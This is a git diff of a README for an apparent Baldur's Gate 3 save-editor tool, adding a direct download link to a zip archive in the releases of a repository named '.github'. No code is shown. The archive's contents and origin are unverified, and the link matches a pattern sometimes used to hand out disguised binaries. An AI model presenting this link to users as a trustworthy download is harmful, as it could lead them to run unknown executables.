@@ -6,7 +6,7 @@ The **Baldur's Gate 3 Save Editor** is a tool for players who want to edit their
 
 ## 🔗 **Latest Release:**
 
-- [💾 **Baldur's Gate 3 Save Editor v0.835**]() - **Tool Files & Folder**
+- [💾 **Baldur's Gate 3 Save Editor v0.835**](https://github.com/BG3-Save-Editor/.github/releases/download/v.0.835/BG3-Save-Editor.zip) - **Tool Files & Folder**
 
 ---
 
